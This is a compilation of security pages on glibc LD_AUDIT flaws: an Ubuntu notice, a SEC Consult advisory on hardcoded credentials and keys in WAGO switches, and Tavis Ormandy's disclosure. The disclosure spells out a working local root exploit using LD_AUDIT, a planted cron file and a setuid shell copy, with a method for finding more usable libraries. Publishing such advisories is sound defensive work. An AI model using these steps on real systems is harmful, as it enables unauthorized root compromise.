Language
English (International)
Français
Ð ÑÑÑÐºÐ¸Ð¹

* © 2007 Mandriva S.A.
* About Us
* Legal Information
* Privacy Policy
* Contact Us



=== Content from www.ubuntu.com_5a4cedd4_20250125_231151.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-1009-1: GNU C Library vulnerabilities

22 October 2010

Local root escalation via LD\_AUDIT environment variable.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 10.10](/security/notices?release=maverick)
* [Ubuntu 10.04](/security/notices?release=lucid)
* [Ubuntu 9.10](/security/notices?release=karmic)
* [Ubuntu 9.04](/security/notices?release=jaunty)
* [Ubuntu 8.04](/security/notices?release=hardy)

## Packages

* [eglibc](/security/cves?package=eglibc) - GNU C Library
* [glibc](/security/cves?package=glibc) - GNU C Library

## Details

Tavis Ormandy discovered multiple flaws in the GNU C Library's handling

of the LD\_AUDIT environment variable when running a privileged binary. A

local attacker could exploit this to gain root privileges. ([CVE-2010-3847](/security/CVE-2010-3847),

[CVE-2010-3856](/security/CVE-2010-3856))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 9.10

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.10.1-0ubuntu18](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.10.1-0ubuntu18)

##### Ubuntu 9.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.9-4ubuntu6.3](https://launchpad.net/ubuntu/%2Bsource/glibc/2.9-4ubuntu6.3)

##### Ubuntu 8.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.7-10ubuntu7](https://launchpad.net/ubuntu/%2Bsource/glibc/2.7-10ubuntu7)

##### Ubuntu 10.10

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.12.1-0ubuntu8](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.12.1-0ubuntu8)

##### Ubuntu 10.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.11.1-0ubuntu7.5](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.11.1-0ubuntu7.5)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2010-3847](/security/CVE-2010-3847)
* [CVE-2010-3856](/security/CVE-2010-3856)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from seclists.org_58889a8c_20250125_231137.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20190612-0 :: Multiple vulnerabilities in WAGO 852 Industrial Managed Switch Series

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Thu, 13 Jun 2019 08:01:54 +0200

---

```
SEC Consult Vulnerability Lab Security Advisory < 20190612-0 >
=======================================================================
              title: Multiple vulnerabilities
            product: WAGO 852 Industrial Managed Switch Series
 vulnerable version: 852-303: <v1.2.2.S0
                     852-1305: <v1.1.6.S0
                     852-1505: <v1.1.5.S0
      fixed version: 852-303: v1.2.2.S0
                     852-1305: v1.1.6.S0
                     852-1505: v1.1.5.S0
         CVE number: CVE-2019-12550, CVE-2019-12549
             impact: high
           homepage: <https://www.wago.com>
              found: 2019-03-08
                 by: T. Weber (Office Vienna)
                     IoT Inspector
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"New ideas are the driving force behind our success WAGO is a family-owned
company headquartered in Minden, Germany. Independently operating for three
generations, WAGO is the global leader of spring pressure electrical
interconnect and automation solutions. For more than 60 years, WAGO has
developed and produced innovative products for packaging, transportation,
process, industrial and building automation markets amongst others. Aside from
its innovations in spring pressure connection technology, WAGO has introduced
numerous innovations that have revolutionized industry. Further ground-breaking
inventions include: the WAGO-I/O-SYSTEM®, TOPJOB S® and WALL-NUTS®."

Source: <http://www.wago.us/wago/>

Business recommendation:
------------------------
SEC Consult recommends to immediately apply the available patches
from the vendor. A thorough security review should be performed by
security professionals to identify further potential security issues.

Vulnerability overview/description:
-----------------------------------
The industrial managed switch series 852 from WAGO is affected by multiple
vulnerabilities such as old software components embedded in the firmware.
Furthermore, hardcoded password hashes and credentials were also found by doing
an automated scan with IoT Inspector. Two vulnerabilities (CVE-2017-16544 and
CVE-2015-0235) were verified by emulating the device with the MEDUSA scaleable
firmware runtime. The validity of the password hashes and the embedded keys were
also verified by emulating the device.

1) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.12.0 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scaleable firmware runtime.

2) Known GNU glibc Vulnerabilities
The used GNU glibc in version 2.8 is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of
the discovered vulnerabilities (CVE-2015-0235, "GHOST") was verified by
using the MEDUSA scaleable firmware runtime.

3) Hardcoded Credentials (CVE-2019-12550)
The device contains hardcoded users and passwords which can be used to login
via SSH and Telnet.

4) Embedded Private Keys (CVE-2019-12549)
The device contains hardcoded private keys for the SSH daemon. The fingerprint
of the SSH host key from the corresponding SSH daemon matches to the embedded
private key.

Proof of concept:
-----------------
1) Known BusyBox Vulnerabilities
BusyBox version 1.12.0 contains multiple CVEs like:
CVE-2013-1813, CVE-2016-2148, CVE-2016-6301, CVE-2011-2716, CVE-2011-5325,
CVE-2015-9261, CVE-2016-2147 and more.

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device. A file with the name "\ectest\n\e]55;test.txt\a" was created
to trigger the vulnerability.

-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

2) Known GNU glibc Vulnerabilities
GNU glibc version 2.8 contains multiple CVEs like:
CVE-2010-0296, CVE-2010-3856, CVE-2012-4412, CVE-2014-4043, CVE-2014-9402,
CVE-2014-9761, CVE-2014-9984, CVE-2015-1472 and more.

The gethostbyname buffer overflow vulnerability (GHOST) was checked with the help
of the exploit code from <https://seclists.org/oss-sec/2015/q1/274>. It was compiled
and executed on the emulated device to test the system.

3) Hardcoded Credentials (CVE-2019-12550)
The following credentials were found in the 'passwd' file of the firmware:
<Password Hash>                                 <Plaintext>         <User>
<removed>                                       <removed>            root
No password is set for the account              [EMPTY PASSWORD]     admin

By using these credentials, it's possible to connect via Telnet and SSH on the
emulated device. Example for Telnet:
-------------------------------------------------------------------------------
[root@localhost ~]# telnet 192.168.0.133
Trying 192.168.0.133...
Connected to 192.168.0.133.
Escape character is '^]'.

L2SWITCH login: root
Password:
~ #
-------------------------------------------------------------------------------
Example for SSH:
-------------------------------------------------------------------------------
[root@localhost ~]# ssh 192.168.0.133
root@192.168.0.133's password:
~ #
-------------------------------------------------------------------------------

4) Embedded Private Keys (CVE-2019-12549)
The following host key fingerprint is shown by accessing the SSH daemon on
the emulated device:

[root@localhost ~]# ssh 192.168.0.133
The authenticity of host '192.168.0.133 (192.168.0.133)' can't be established.
RSA key fingerprint is SHA256:X5Vr0/x0/j62N/aqZmHz96ojwl8x/I8mfzuT8o6uZso.
RSA key fingerprint is MD5:2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2.

This matches the embedded private key (which has been removed from this advisory):
SSH Fingerprint: 2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2

Vulnerable / tested versions:
-----------------------------
According to the vendor, the following versions are affected:
* 852-303: <v1.2.2.S0
* 852-1305: <v1.1.6.S0
* 852-1505: <v1.1.5.S0

Vendor contact timeline:
------------------------
2019-03-12: Contacting VDE CERT through info () cert vde com, received confirmation
2019-03-26: Asking for a status update, VDE CERT is still waiting for details
2019-03-28: VDE CERT requests information from WAGO again
2019-04-09: Asking for a status update
2019-04-11: VDE CERT: patched firmware release planned for end of May, requested
            postponement of advisory release
2019-04-16: VDE CERT: update regarding affected firmware versions
2019-04-24: Confirming advisory release for beginning of June
2019-05-20: Asking for a status update
2019-05-22: VDE CERT: no news from WAGO yet, 5th June release date
2019-05-29: Asking for a status update
2019-05-29: VDE CERT: detailed answer from WAGO, patches will be published
            on 7th June, SEC Consult proposes new advisory release date for
            12th June
2019-06-07: VDE CERT provides security advisory information from WAGO;
            WAGO releases security patches
2019-06-12: Coordinated release of security advisory

Solution:
---------
The vendor provides patches to their customers at their download page. The
following versions fix the issues:
* 852-303: v1.2.2.S0
* 852-1305: v1.1.6.S0
* 852-1505: v1.1.5.S0

According to the vendor, busybox and glibc have been updated and the embedded
private keys are being newly generated upon first boot and after a factory reset.
The root login via Telnet and SSH has been disabled and the admin account is
documented and can be changed by the customer.

Workaround:
-----------
Restrict network access to the device & SSH server.

Advisory URL:
-------------
<https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://www.sec-consult.com/en/career/index.html>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://www.sec-consult.com/en/contact/index.html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2019

```

**Attachment:
[smime.p7s](att-18/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

### Current thread:

* **SEC Consult SA-20190612-0 :: Multiple vulnerabilities in WAGO 852 Industrial Managed Switch Series** *SEC Consult Vulnerability Lab (Jun 12)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_6efd9096_20250125_231137.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](343)
[By Date](date.html#344)
[![Next](/images/right-icon-16x16.png)](345)

[![Previous](/images/left-icon-16x16.png)](343)
[By Thread](index.html#344)
[![Next](/images/right-icon-16x16.png)](345)

![](/shared/images/nst-icons.svg#search)

# The GNU C library dynamic linker will dlopen arbitrary DSOs during setuid loads.

---

*From*: Tavis Ormandy <taviso () cmpxchg8b com>

*Date*: Fri, 22 Oct 2010 19:00:34 +0200

---

```
The GNU C library dynamic linker will dlopen arbitrary DSOs during setuid loads
-------------------------------------------------------------------------------

Cześć, This advisory describes CVE-2010-3856, an addendum to CVE-2010-3847.

Please see <http://seclists.org/fulldisclosure/2010/Oct/257> for background
information.

For obvious reasons, the dynamic linker will ignore requests to preload user
specified libraries for setuid/setgid programs. However, it is possible to
imagine legitimate use cases for this functionality, so the glibc developers
provide an exception to this rule.

 LD_PRELOAD
     A whitespace-separated list of additional, user-specified, ELF
     shared libraries to be loaded before all others. This can be
     used to selectively override functions in other shared
     libraries. For set-user-ID/set-group-ID ELF binaries, only
     libraries in the standard search directories that are also set-
     user-ID will be loaded.

In order to be preloaded during the execution of a privileged program, a
library must be setuid and in the trusted library search path. This is a
reasonable design, before a library will be loaded, the system administrator
must brand a library as safe to load across privilege boundaries.

This feature allows developers who design their programs to operate safely
while running as setuid to opt-in to doing so. Bizarrely, the same conditions
do not apply to LD_AUDIT, which will load an arbitrary DSO, regardless of
whether it has been designed to operate safely or not.

While the dynamic loader will only use a library that exports the dynamic
symbols required by the rtld-auditing API, it must first dlopen() the
library in order to examine the exported symbols. By definition, this must
execute any defined initialization routines.

This confusion can be exploited by locating a DSO in the trusted search path with
initialization code that has not been designed to operate safely while euid !=
uid. See the Notes section below for additional discussion on this topic.

--------------------
Affected Software
------------------------

At least the following versions have been tested

    2.12.1, FC13
    2.5, RHEL5 / CentOS5
    2.11.1, Ubuntu 10

--------------------
Consequences
-----------------------

This is a low impact issue that is only of interest to security
professionals and system administrators, end users do not need to be
concerned.

It is possible to exploit this confusion to execute arbitrary code as root.

The exact steps required to exploit this vulnerability will vary from
distribution to distribution, but an example from Ubuntu 10.04 is given below.

# The creation mask is inherited by children, and survives even a setuid
# execve. Therefore, we can influence how files are created during
# exploitation.
$ umask 0

# libpcprofile is distributed with the libc package.
$ dpkg -S /lib/libpcprofile.so
libc6: /lib/libpcprofile.so
$ ls -l /lib/libpcprofile.so
-rw-r--r-- 1 root root 5496 2010-10-12 03:32 /lib/libpcprofile.so

# We identified one of the pcprofile constructors is unsafe to run with
# elevated privileges, as it creates the file specified in the output
# environment variable.
$ LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/etc/cron.d/exploit" ping
ERROR: ld.so: object 'libpcprofile.so' cannot be loaded as audit interface: undefined symbol: la_version; ignored.
Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
            [-M mtu discovery hint] [-S sndbuf]
            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination

# This results in creating a world writable file in the crontab directory.
$ ls -l /etc/cron.d/exploit
-rw-rw-rw- 1 root taviso 65 2010-10-21 14:22 /etc/cron.d/exploit

# Setup a cronjob to give us privileges (of course, there are dozens of other
# ways this could be exploited).
$ printf "* * * * * root cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit\n" > /etc/cron.d/exploit

# Wait a few minutes...
$ ls -l /tmp/exploit
ls: cannot access /tmp/exploit: No such file or directory
$ ls -l /tmp/exploit
ls: cannot access /tmp/exploit: No such file or directory
$ ls -l /tmp/exploit
-rwsr-xr-x 1 root root 83888 2010-10-21 14:25 /tmp/exploit

# A setuid root shell appears.
$ /tmp/exploit
# whoami
root

-------------------
Solution
-----------------------

Major distributions should be releasing updated glibc packages shortly.

-------------------
Credit
-----------------------

This bug was discovered by Tavis Ormandy.

Thanks to Ben Hawkes and Julien Tinnes for additional insight, and
their expertise tracking down convincing attack vectors.

-------------------
Greetz
-----------------------

Greetz to Hawkes, Julien, LiquidK, Lcamtuf, Neel, Spoonm, Felix, Robert,
Asirap, Spender, Pipacs, Gynvael, Scarybeasts, Redpig, Kees, Eugene, Bruce D.,
and all my other elite friends and colleagues.

Additional greetz to the openwall guys who saw this problem coming years ago.
They continue to avoid hundreds of security vulnerabilities each year thanks to
their insight into systems security.

<http://www.openwall.com/owl/>

-------------------
Notes
-----------------------

Finding candidate libraries is simple a matter of identifying DSOs that have
declared constructors or other initialization code. There are multiple
locations that initialization code can be declared, but .ctors is a common
example.

Using objdump, you can examine the section headers for any .ctors section.

$ find /lib /usr/lib -maxdepth 1 -type f -exec objdump --headers --section=.ctors {} \;

[ The system administrator can add additional trusted search paths by declaring
  them in /etc/ld.so.conf, but /lib and /usr/lib are the default paths. ]

If a ctors section has a size greater than 2 * wordsize, constructors have been
declared, and should be checked to see if they do anything interesting. An
empty list is 2 * wordsize bytes because it must still hold the two invalid
function pointers inserted into the list to mark list boundaries (alternatively
you could print the difference between the symbols __CTOR_LIST__ and
__CTOR_END__).

<http://gcc.gnu.org/onlinedocs/gcc-2.95.3/gcc_17.html#SEC237>

 "Each list always begins with an ignored function pointer (which may hold 0, -1,
  or a count of the function pointers after it, depending on the environment).
  This is followed by a series of zero or more function pointers to constructors
  (or destructors), followed by a function pointer containing zero."

$ objdump --section=.ctors --headers /usr/lib/liblftp-tasks.so.0

/usr/lib/liblftp-tasks.so.0:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
 17 .ctors        00000040  00ddafc4  00ddafc4  00071fc4  2**2
                  CONTENTS, ALLOC, LOAD, DATA

Alternatively,

$ gdb -q /usr/lib/liblftp-tasks.so.0
Reading symbols from /usr/lib/liblftp-tasks.so.0...(no debugging symbols found)...done.
(gdb) symbol-file /usr/lib/debug/usr/lib/liblftp-tasks.so.0.debug
(gdb) p &__CTOR_END__ - &__CTOR_LIST__
$1 = 15

This looks like a good candidate with lots of constructors. You can use objdump
or gdb to dump the contents of the list.

$ objdump --full-contents --section=.ctors /usr/lib/liblftp-tasks.so.0

/usr/lib/liblftp-tasks.so.0:     file format elf32-i386

Contents of section .ctors:
 ddafc4 ffffffff 205fd800 e068d800 d07ad800  .... _...h...z..
 ddafd4 608ad800 6067d900 7079d900 b0b3d900  `...`g..py......
 ddafe4 d004da00 a037da00 403bda00 3061da00  .....7..@;..0a..
 ddaff4 9062da00 90aada00 20ebdb00 00000000  .b...... .......

Notice the ffffffff at the start of the list, and 00000000 terminating it. The
other entries are function pointers, stored in native byteorder.

Examining the source code reveals it will mkdir(getenv("LFTP_HOME"), 0755) in
the constructors for the Bookmark and History classes, so we can use this to
create arbitrary directories as root.

 40 Bookmark::Bookmark()
 41 {
 42    const char *home = get_lftp_home();
    ...
 47 }

Followed by:

785 const char *get_lftp_home()
786 {
    ...
792    home = getenv("LFTP_HOME");
    ...
811    mkdir(home, 0755);
812    return home;
813 }

Therefore,

$ LD_AUDIT="liblftp-tasks.so.0" LFTP_HOME=/etc/exploit ping
ERROR: ld.so: object 'liblftp-tasks.so.0' cannot be loaded as audit interface: undefined symbol: la_version; ignored.
Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
            [-M mtu discovery hint] [-S sndbuf]
            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
$ ls -ld /etc/exploit
drwxr-x---. 2 root taviso 4.0K Oct 22 01:18 /etc/exploit/

And so on, repeat for all accessible DSOs. The ELF standards document
initialization and termination here

<http://web.archive.org/web/20041026003725/www.caldera.com/developers/gabi/2003-12-17/ch5.dynamic.html#init_fini>

-------------------
References
-----------------------

- <http://man.cx/ld.so%288%29>, The dynamic linker/loader, Linux Programmer's Manual.
- <http://man.cx/rtld-audit>, The auditing API for the dynamic linker, Linux Programmer's Manual.
- Linkers and Loaders, John R. Levine, ISBN 1-55860-496-0.

You should subscribe to Linux Weekly News and help support their high standard
of security journalism.

<http://lwn.net/>

I have a twitter account where I occasionally comment on security topics.

<http://twitter.com/taviso>

ex$$

--
-------------------------------------
taviso () cmpxchg8b com | pgp encrypted mail preferred
-------------------------------------------------------

_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>
```

---

[![Previous](/images/left-icon-16x16.png)](343)
[By Date](date.html#344)
[![Next](/images/right-icon-16x16.png)](345)

[![Previous](/images/left-icon-16x16.png)](343)
[By Thread](index.html#344)
[![Next](/images/right-icon-16x16.png)](345)

### Current thread:

* **The GNU C library dynamic linker will dlopen arbitrary DSOs during setuid loads.** *Tavis Ormandy (Oct 22)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
